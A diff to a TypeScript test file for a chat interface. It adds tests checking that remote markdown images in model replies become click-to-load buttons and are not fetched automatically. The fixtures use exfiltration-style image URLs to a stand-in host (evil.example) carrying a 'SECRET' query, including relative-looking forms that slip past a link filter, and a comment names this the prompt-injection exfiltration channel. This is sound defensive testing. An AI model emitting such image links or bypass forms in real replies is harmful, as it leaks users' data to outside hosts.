@@ -191,11 +191,12 @@ const RAW_HTML_TRIPWIRES = [
 ].join('\n\n')
 
 /**
- * ⚠ MODEL OUTPUT CANNOT BUILD DOM (#233). Model output is untrusted text entering a DOM.
+ * ⚠ MODEL HTML NEVER BECOMES AN ELEMENT (#233). Model output is untrusted text entering a DOM.
  * Since `@tanstack/ai-react` 0.25, `TextPart` renders through `@tanstack/markdown`'s streaming
  * profile: raw HTML is ESCAPED rather than parsed and sanitised, and executable link
  * destinations are removed. (Before it, the chain was react-markdown with `rehype-raw` and
- * `rehype-sanitize` LAST, and this test pinned that order.)
+ * `rehype-sanitize` LAST, and this test pinned that order.) Markdown's OWN elements — links,
+ * images — still render; what a remote image may fetch is the tests below it.
  *
  * So the raw tripwires must arrive as visible TEXT — escaped, not eaten, so the reply around
  * them survives whole — and as no element at all. A red line here means a renderer change
@@ -241,6 +242,35 @@ test('⚠ a disguised executable scheme is refused too — mixed case, or split 
     expect(rendered).toContain('inert')
     expect(rendered).not.toContain('<a')
   }
+})
+
+/**
+ * ⚠ A REMOTE IMAGE IS NOT FETCHED UNTIL A CLICK (PR #350 review; `markdown-image.tsx`). The
+ * renderer would emit `<img src>` — and React a `<link rel="preload">` — for any http(s) URL,
+ * which the browser requests with no click: the prompt-injection exfiltration channel. So the
+ * reply carries a button naming the host and the full URL, and no element that fetches. The
+ * two relative-LOOKING forms are the ones a pattern check misses: the link filter keeps
+ * anything starting with `/`, and a browser resolves both to another host.
+ */
+test('⚠ a remote markdown image renders as a click-to-load button showing the full URL — nothing fetches', () => {
+  for (const [source, host] of [
+    ['https://evil.example/p.png?q=SECRET', 'evil.example'],
+    ['//evil.example/p.png?q=SECRET', 'evil.example'],
+    ['/\\evil.example/p.png?q=SECRET', 'evil.example'],
+  ] as const) {
+    const rendered = html({ key: 'text', part: { type: 'text', content: `![chart](${source})` } })
+    expect(rendered).not.toContain('<img')
+    expect(rendered).not.toContain('rel="preload"')
+    expect(rendered).toContain(`aria-label="load image from ${host}"`)
+    expect(rendered).toContain('p.png?q=SECRET')
+  }
+})
+
+// The control: an image on this page's own server leaves nothing, so it renders at once.
+test('a markdown image on this server renders as an <img> immediately', () => {
+  const rendered = html({ key: 'text', part: { type: 'text', content: '![diagram](diagram.png)' } })
+  expect(rendered).toContain('<img alt="diagram"')
+  expect(rendered).toContain('src="diagram.png"')
 })
 
 // The user's image (#68): inline bytes render as the image; a URL source stays visible as data, not fetched.
